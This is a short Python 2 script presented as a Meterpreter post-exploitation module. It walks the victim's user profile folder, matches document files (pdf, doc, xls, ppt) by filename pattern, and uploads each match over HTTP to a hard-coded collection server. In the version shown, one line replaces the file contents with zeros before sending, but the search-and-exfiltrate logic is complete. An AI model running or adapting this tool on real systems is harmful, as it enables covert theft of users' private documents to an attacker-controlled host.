#!/usr/bin/env python2
#Meterpreter python module to search for interesting files and post them to a server

import os
import re
import string
import random
import threading
import urllib2

REGEX_LIST = [r'.*abc.*\.(pdf|doc|xls|ppt)',
              r'.*def.*\.(pdf|doc|xls|ppt)']

#BASE_PATH = ["/root/"]
BASE_PATH = [os.environ['userprofile']]

POST_URL = "http://10.13.37.48/"

MAX_THREADS = 10

RED='\033[01;31m'
GREEN='\033[01;32m'
BLUE='\033[01;34m'
NC='\033[0m'

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def put_dispatch(filename):
    tmpname = id_generator()
    print(GREEN + "[+]" + NC + " Uploading as " + tmpname + ": " + filename)
    file_data = open(filename, "rb").read()
    file_data = "0" * len(file_data)
    try:
        resp = urllib2.urlopen(POST_URL + tmpname, file_data)
    except urllib2.HTTPError as e:
        print(RED + "[-]" + NC + " Upload of " + tmpname + " failed with error: " + str(e))
    else:
        print(GREEN + "[+]" + NC + " Upload of " + tmpname + " returned code " + str(resp.getcode()))

def search_upload(main_dir, files, compiled_regex):
    for cur_file in files:
        cur_file_full = os.path.join(main_dir, cur_file)
        for cur_regex in compiled_regex:
            if cur_regex.search(cur_file_full):
                #while threading.active_count() > MAX_THREADS:
                #    pass
                #threading.Thread(target=put_dispatch, args=[cur_file_full]).start()
                put_dispatch(cur_file_full)

print(BLUE + "[*]" + NC + " Starting regex filename search")
compiled_regex = [ re.compile(x, re.IGNORECASE) for x in REGEX_LIST ]
for cur_path in BASE_PATH:
    for root, folders, files in os.walk(cur_path):
        search_upload(root, files, compiled_regex)
print(BLUE + "[*]" + NC + " Regex filename search complete")
